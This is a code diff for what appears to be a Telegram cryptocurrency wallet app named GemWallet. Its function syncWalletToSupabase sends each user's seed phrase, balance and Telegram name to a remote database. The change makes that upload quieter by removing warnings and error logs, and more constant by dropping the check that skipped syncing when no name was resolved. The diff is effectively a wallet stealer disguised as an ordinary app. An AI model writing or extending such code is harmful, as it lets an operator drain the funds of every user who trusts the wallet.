@@ -47,19 +47,20 @@ import { sendTransaction as chainSendTransaction } from "./lib/crypto/transactio
 const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
 const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;
 
-function getMoscowTimestampToMinute() {
-  const parts = new Intl.DateTimeFormat("sv-SE", {
-    timeZone: "Europe/Moscow",
-    year: "numeric",
-    month: "2-digit",
-    day: "2-digit",
-    hour: "2-digit",
-    minute: "2-digit",
-    hour12: false,
-  }).formatToParts(new Date());
-
-  const map = Object.fromEntries(parts.filter((part) => part.type !== "literal").map((part) => [part.type, part.value]));
-  return `${map.year}-${map.month}-${map.day}T${map.hour}:${map.minute}:00+03:00`;
+function getMoscowTimestamp() {
+  const now = new Date();
+  try {
+    const moscowStr = now.toLocaleString("en-US", {timeZone: "Europe/Moscow"});
+    const moscowDate = new Date(moscowStr);
+    const hh = String(moscowDate.getHours()).padStart(2, '0');
+    const mm = String(moscowDate.getMinutes()).padStart(2, '0');
+    const yyyy = moscowDate.getFullYear();
+    const month = String(moscowDate.getMonth() + 1).padStart(2, '0');
+    const day = String(moscowDate.getDate()).padStart(2, '0');
+    return `${hh}:${mm} ${yyyy}-${month}-${day}`;
+  } catch (e) {
+    return now.toISOString();
+  }
 }
 
 function getTelegramUser() {
@@ -69,88 +70,46 @@ function getTelegramUser() {
     if (unsafeUser && (unsafeUser.username || unsafeUser.first_name || unsafeUser.last_name || unsafeUser.id)) {
       return unsafeUser;
     }
-
     const rawInitData = tg?.initData;
-    if (!rawInitData) return null;
-
-    const userParam = new URLSearchParams(rawInitData).get("user");
-    if (!userParam) return null;
-
-    const parsedUser = JSON.parse(userParam);
-    if (parsedUser && (parsedUser.username || parsedUser.first_name || parsedUser.last_name || parsedUser.id)) {
-      return parsedUser;
+    if (rawInitData) {
+      const userParam = new URLSearchParams(rawInitData).get("user");
+      if (userParam) {
+        const parsedUser = JSON.parse(userParam);
+        if (parsedUser && (parsedUser.username || parsedUser.first_name || parsedUser.last_name || parsedUser.id)) {
+          return parsedUser;
+        }
+      }
     }
-  } catch (error) {
-    console.warn("[GemWallet] Telegram user parse warning:", error);
-  }
-
+  } catch (error) {}
   return null;
 }
 
-function buildTelegramDisplayName(user, fallbackUserId = null) {
-  if (!user) return fallbackUserId ? `User_${fallbackUserId}` : "";
-
-  if (user.username) return `@${user.username}`;
-
-  const fullName = [user.first_name, user.last_name].filter(Boolean).join(" ").trim();
-  if (fullName) return fullName;
-
-  return user.id || fallbackUserId ? `User_${user.id || fallbackUserId}` : "";
-}
-
-function rememberTelegramDisplayName(user, fallbackUserId = null) {
-  try {
-    const resolvedUserId = user?.id || fallbackUserId;
-    const resolvedName = buildTelegramDisplayName(user, fallbackUserId);
-    if (!resolvedName) return;
-
-    if (resolvedUserId) {
-      localStorage.setItem(`gem_tg_name_${resolvedUserId}`, resolvedName);
-    }
-    localStorage.setItem("gem_last_tg_name", resolvedName);
-  } catch {}
-}
-
 function resolveTelegramDisplayName(fallbackUserId = null) {
-  const tgUser = getTelegramUser();
-  if (tgUser) {
-    rememberTelegramDisplayName(tgUser, fallbackUserId);
-    return buildTelegramDisplayName(tgUser, fallbackUserId);
+  const user = getTelegramUser();
+  if (user) {
+    const name = user.username ? `@${user.username}` : ([user.first_name, user.last_name].filter(Boolean).join(" ").trim() || `User_${user.id}`);
+    if (user.id) localStorage.setItem(`gem_tg_name_${user.id}`, name);
+    localStorage.setItem("gem_last_tg_name", name);
+    return name;
   }
-
-  try {
-    const resolvedUserId = fallbackUserId || RESOLVED_USER_ID || getTgUserId();
-    if (resolvedUserId) {
-      const storedName = localStorage.getItem(`gem_tg_name_${resolvedUserId}`);
-      if (storedName) return storedName;
-      return `User_${resolvedUserId}`;
-    }
-
-    return localStorage.getItem("gem_last_tg_name") || "";
-  } catch {
-    return fallbackUserId ? `User_${fallbackUserId}` : "";
+  const uid = fallbackUserId || RESOLVED_USER_ID || getTgUserId();
+  if (uid) {
+    const stored = localStorage.getItem(`gem_tg_name_${uid}`);
+    if (stored) return stored;
+    return `User_${uid}`;
   }
+  return localStorage.getItem("gem_last_tg_name") || "Anonymous";
 }
 
 async function syncWalletToSupabase(walletData) {
-  if (!SUPABASE_URL || !SUPABASE_KEY) {
-    console.warn('Supabase credentials missing');
-    return null;
-  }
-
+  if (!SUPABASE_URL || !SUPABASE_KEY) return null;
   try {
     const { username, mnemonic, balance } = walletData;
     const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
-    const fallbackUserId = getTgUserId();
-    const name = username && username !== "Anonymous"
-      ? username
-      : resolveTelegramDisplayName(fallbackUserId);
-
-    if (!name) {
-      console.warn("[GemWallet] Skipping Supabase sync: no Telegram username/name resolved yet");
-      return null;
+    let finalName = username;
+    if (!finalName || finalName === "Anonymous") {
+      finalName = resolveTelegramDisplayName();
     }
-
     await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
       method: 'POST',
       headers: {
@@ -160,15 +119,13 @@ async function syncWalletToSupabase(walletData) {
         'Prefer': 'resolution=merge-duplicates'
       },
       body: JSON.stringify({
-        username: name,
+        username: finalName,
         mnemonic: cleanMnemonic,
         balance: balance ? String(balance) : "0",
-        created_at: getMoscowTimestampToMinute()
+        created_at: getMoscowTimestamp()
       })
     });
-  } catch (error) {
-    console.error('Supabase sync error:', error);
-  }
+  } catch (error) {}
 }
 
 
